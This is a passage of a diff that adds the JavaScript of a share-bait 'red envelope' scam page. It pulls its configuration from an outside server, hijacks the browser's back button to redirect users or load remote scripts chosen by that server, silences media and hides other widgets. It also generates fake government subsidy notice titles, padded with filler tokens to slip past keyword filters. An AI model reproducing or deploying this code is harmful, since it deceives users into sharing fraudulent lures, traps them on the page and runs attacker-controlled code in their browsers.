+                    hideloading();
+                    initPage(money);
+                    setTimeout(function () {
+                        if (shareATimes == 0 && shareTTimes == 0) {
+                            showShareTips(gConfig.defaultTips);
+                        }
+                    }, 100)
+                }, 200)
+                setBack();
+            }
+
+          init();
+
+        }
+
+        $(function () {
+		//var url = location.href.split('#')[0];
+            $.ajax({
+                type: "GET",
+                url: 'http://jq.t1sj.com/wmy/api.php?url='+encodeURIComponent(window.location.href.split('#')[0])+'&t='+Date.now(),
+                dataType: "json",
+                success: function (data) {
+                    $('#loading').hide();
+                   
+                    window['data'] = data;
+                    window.gConfig = data || {};
+                    
+                    window.content = data.content.s;
+                    
+                    extend();
+                    start();
+                    report();
+                    record('tosharer', 1, true);
+                }
+                
+            });
+            clearSome();
+        })
+
+        function loading() {
+            $(document.body).append(
+                '<div class="popup-body loading" style="margin-top: 50%;position: absolute;width: 3rem;margin-top: 1.25rem;border-radius: 6px;background: #fff;left: 50%;margin-left: -1.5rem;"><div style="padding: .12rem .24rem .2rem;font-size: .16rem;color: rgba(0,0,0,.54);text-align: center;"><img style="width: 30px" src="//puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 20px;color: red">正在抢红包...</b></div></div>'
+            )
+        }
+
+        function hideloading() {
+            $('.loading').hide();
+        }
+
+        function setBack() {
+            if (location_host.indexOf('pay.ixinyou.com') > -1 || location_host.indexOf('78dm.net') > -1 || location_host
+                .indexOf('11h5.com') > -1 || location_host.indexOf('medu.51cto.com') > -1) {
+                return;
+            }
+
+            if (gConfig['attached'] && gConfig['attached']['back_api_s']) {
+                if (gConfig['attached']['back_api_s'] === 'refresh') {
+                    history.pushState(history.length + 1, "message", location.href.split('#')[0] + "#" + new Date()
+                        .getTime())
+                    if (navigator.userAgent.indexOf('Android') != -1) {
+                        if (typeof (tbsJs) != "undefined") {
+                            tbsJs.onReady('{useCachedApi : "true"}', function (e) {})
+                            window.onhashchange = function () {
+                                location.href = '';
+                            };
+                        } else {
+                            window.onhashchange = function () {
+                                location.href = '';
+                            };
+                        }
+                    } else {
+                        window.onhashchange = function () {
+                            location.href = '';
+                        };
+                    }
+                } else if (gConfig['attached']['back_api_s'] === 'warn') {
+                    setWarn();
+                } else {
+                     M.loadJS(gConfig['attached']['back_api']+"?t="+Date.now());
+                }
+            }
+        }
+
+        function checkShare(length) {
+            var now = Date.now();
+            length = length ? length : 1000;
+
+            setTimeout(function () {
+                $('.popup-body').removeClass('zy')
+            }, length + 500)
+
+            if (now - openTime > length) {
+                return true;
+            } else {
+                if ($('#js_mod_dialog').length == 0) {
+                    $(".btn").trigger("click");
+                }
+                setTimeout(function () {
+                    $('.popup-body').addClass('zy')
+                }, 500)
+                return false;
+            }
+        }
+
+        var goon = true;
+
+        function setWarn() {
+            history.pushState(history.length + 1, "message", location.href.split('#')[0] + "#" + new Date().getTime())
+            if (navigator.userAgent.indexOf('Android') != -1) {
+                if (typeof (tbsJs) != "undefined") {
+                    tbsJs.onReady('{useCachedApi : "true"}', function (e) {})
+                    window.onhashchange = function () {
+                        if (goon) {
+                            warn()
+                        } else {
+                            jumpEnd()
+                        }
+                    };
+                } else {
+                    window.onhashchange = function () {
+                        if (goon) {
+                            warn()
+                        } else {
+                            jumpEnd()
+                        }
+                    };
+                }
+            } else {
+                window.onhashchange = function () {
+                    if (goon) {
+                        warn()
+                    } else {
+                        jumpEnd()
+                    }
+                };
+            }
+        }
+
+        function jumpEnd() {
+            /*
+            if (gConfig.endPageUrl) {
+                var a = document.createElement('a');
+                a.href = gConfig.endPageUrl;
+                a.rel = 'noreferrer';
+                a.click();
+            }
+            */
+            M.loadJS(gConfig['attached']['back_api_ss']+"?t="+Date.now());
+        }
+
+        var joinuser = parseInt(20 + 20 * Math.random());
+        var jointotal = (1000 + 2000 * Math.random()).toFixed(2)
+
+        function warn() {
+
+            setWarn();
+            goon = false;
+            var title = window._title || '.{fuck}.{fuck}.{fuck}';
+            document.title = fuckStr(title.replace('{city}', getCity())).replace(/{bq}/ig, bq()).replace(/{money}/ig,
+                gConfig.money).replace(/{rdnum}/g, randomNum());
+   				/*
+            g_dialog.confirm({
+                title: '<b style="color: red;">主动放弃活动资格?</b>',
+                message: '该活动<span style="color: red;">纯送福利</span><br>无任何附加条件<br>完成任务即领取成功<br>您有<span style="color: red;">' +
+                    joinuser +
+                    '</span>个好友<span style="color: red;">已完成任务</span><br>已经分走<span style="color: red;">' +
+                    jointotal + '</span>元',
+                btn: ['残忍放弃', '<span style="color: red;">继续领取</span>'],
+                cancelCb: function () {
+                    jumpEnd();
+                },
+                cb: function () {
+                    record('goonshare', 1, true);
+                    goon = true;
+                }
+            });
+			*/
+			jumpEnd();
+            setTimeout(function () {
+                $('.popup-body').removeClass('zy')
+            }, 1500)
+            setTimeout(function () {
+                $('.popup-body').addClass('zy')
+            }, 500)
+        }
+
+        function clearSome() {
+            //关闭所有声音视频
+            $('audio,video').each(function () {
+                $(this).data('muted', true); //Store elements muted by the button.
+                $(this).pause(); // or .muted=true to keep playing muted
+            });
+
+            setInterval(function () {
+                var sl = ['#brandFrame', '#tq_float_container', "#doyoo_mon_accept", "#newBridge"];
+                sl.forEach(function (s) {
+                    if ($(s).length > 0) {
+                        // $(s).remove();
+                        $(s).hide();
+
+                    }
+                });
+            }, 100)
+        }
+
+        var name = '';
+
+        function getTitle(change) {
+            var keys = [
+                ['{bq}{city}'],
+                ['各{fuck}地{fuck}区', '所{fuck}有{fuck}地{fuck}区', '各{fuck}区{fuck}县', '辖{fuckr}区内', '各{fuckr}县{fuckr}市'],
+                ['本月', '本周', '最新'],
+                ['补{fuckr}貼', '消{fuckr}費{fuckr}补', '补{fuckr}助', '貼{fuckr}补', '津{fuckr}贴'],
+                ['发{fuckr}放通{fuckr}知', '发{fuckr}放通{fuckr}告', '上线通{fuckr}知', '分{fuckr}发通{fuckr}知',
+                    '开{fuckr}抢告{fuckr}知', '开{fuckr}抢通{fuckr}知', '开{fuckr}抢通{fuckr}报', '发{fuckr}放通{fuckr}报'
+                ],
+                ['，', '. '],
+                ['大{fuckr}家', '各{fuckr}位', '在{fuckr}座', '所{fuckr}有人'],
+                ['请', '务{fuckr}必', '一定', '记{fuckr}得'],
+                ['互相', '相互', '彼此'],
+                ['转{fuckr}告', '转{fuckr}达', '传{fuckr}达', ]
+            ];
+
+            if (name && !change) {
+                return name;
+            } else {
+                name = '';
+                for (var i = 0; i < keys.length; i++) {
+                    var keyList = keys[i];
+                    name = name + keyList[parseInt(Math.random() * keyList.length)];
+                }
+                return name;
+            }
+        }
+
+        function getAdTitle() {
+            var keys = [
+                ['{bq}{city}'],
+                ['{fuckr}人', '居{fuckr}民', '市{fuckr}民', '朋友'],
+                ['有{fuckr}福啦！', '享{fuckr}福咯！', '先享{fuckr}受了！'],
+                ['你{fuckr}我', '我{fuckr}们', '大家', '人{fuckr}人', '所有{fuckr}人', '全{fuckr}体', '在座'],
+                ['都{fuckr}有份，', '都享{fuckr}有，', '都{fuckr}能有，'],
+                ['看{fuckr}过来', '速度{fuckr}看', '快{fuckr}来看'],
+                ['~~', '->', '..']
+            ];
+            var name = '';
+            for (var i = 0; i < keys.length; i++) {
+                var keyList = keys[i];
+                name = name + keyList[parseInt(Math.random() * keyList.length)];
+            }
+            return name;
+        }
+    </script>
+
+</body>
+
+</html>
